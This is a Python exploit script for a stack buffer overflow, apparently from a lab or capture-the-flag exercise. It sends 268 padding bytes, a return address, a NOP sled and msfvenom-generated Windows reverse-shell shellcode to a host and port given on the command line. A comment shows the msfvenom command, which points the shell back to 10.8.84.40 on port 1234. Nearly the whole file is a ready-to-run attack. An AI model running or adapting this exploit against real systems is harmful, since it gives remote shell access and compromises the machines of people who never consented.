import socket, sys

def main(target, port):

#msfvenom -p windows/shell_reverse_tcp lport=1234 lhost=10.8.84.40 -a x86 -f python -b "\x00"

	buf =  b""
	buf += b"\xd9\xce\xd9\x74\x24\xf4\xba\x4c\x6f\x2d\x30\x5e\x2b"
	buf += b"\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc\x03\x1a\x7c\xcf"
	buf += b"\xc5\x5e\x6a\x8d\x26\x9e\x6b\xf2\xaf\x7b\x5a\x32\xcb"
	buf += b"\x08\xcd\x82\x9f\x5c\xe2\x69\xcd\x74\x71\x1f\xda\x7b"
	buf += b"\x32\xaa\x3c\xb2\xc3\x87\x7d\xd5\x47\xda\x51\x35\x79"
	buf += b"\x15\xa4\x34\xbe\x48\x45\x64\x17\x06\xf8\x98\x1c\x52"
	buf += b"\xc1\x13\x6e\x72\x41\xc0\x27\x75\x60\x57\x33\x2c\xa2"
	buf += b"\x56\x90\x44\xeb\x40\xf5\x61\xa5\xfb\xcd\x1e\x34\x2d"
	buf += b"\x1c\xde\x9b\x10\x90\x2d\xe5\x55\x17\xce\x90\xaf\x6b"
	buf += b"\x73\xa3\x74\x11\xaf\x26\x6e\xb1\x24\x90\x4a\x43\xe8"
	buf += b"\x47\x19\x4f\x45\x03\x45\x4c\x58\xc0\xfe\x68\xd1\xe7"
	buf += b"\xd0\xf8\xa1\xc3\xf4\xa1\x72\x6d\xad\x0f\xd4\x92\xad"
	buf += b"\xef\x89\x36\xa6\x02\xdd\x4a\xe5\x4a\x12\x67\x15\x8b"
	buf += b"\x3c\xf0\x66\xb9\xe3\xaa\xe0\xf1\x6c\x75\xf7\xf6\x46"
	buf += b"\xc1\x67\x09\x69\x32\xae\xce\x3d\x62\xd8\xe7\x3d\xe9"
	buf += b"\x18\x07\xe8\xbe\x48\xa7\x43\x7f\x38\x07\x34\x17\x52"
	buf += b"\x88\x6b\x07\x5d\x42\x04\xa2\xa4\x05\x21\x3b\xf2\xfd"
	buf += b"\x5d\x39\xfa\xf9\x4f\xb4\x1c\x6b\x60\x91\xb7\x04\x19"
	buf += b"\xb8\x43\xb4\xe6\x16\x2e\xf6\x6d\x95\xcf\xb9\x85\xd0"
	buf += b"\xc3\x2e\x66\xaf\xb9\xf9\x79\x05\xd5\x66\xeb\xc2\x25"
	buf += b"\xe0\x10\x5d\x72\xa5\xe7\x94\x16\x5b\x51\x0f\x04\xa6"
	buf += b"\x07\x68\x8c\x7d\xf4\x77\x0d\xf3\x40\x5c\x1d\xcd\x49"
	buf += b"\xd8\x49\x81\x1f\xb6\x27\x67\xf6\x78\x91\x31\xa5\xd2"
	buf += b"\x75\xc7\x85\xe4\x03\xc8\xc3\x92\xeb\x79\xba\xe2\x14"
	buf += b"\xb5\x2a\xe3\x6d\xab\xca\x0c\xa4\x6f\xfa\x46\xe4\xc6"
	buf += b"\x93\x0e\x7d\x5b\xfe\xb0\xa8\x98\x07\x33\x58\x61\xfc"
	buf += b"\x2b\x29\x64\xb8\xeb\xc2\x14\xd1\x99\xe4\x8b\xd2\x8b"

	buffer = "A" * 268 + "\x5b\x4e\xd3\x77" + "\x90" * 16 + buf

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((target, int(port)))

	s.send(buffer)

	s.close()

if __name__ == "__main__":

	main(sys.argv[1], sys.argv[2])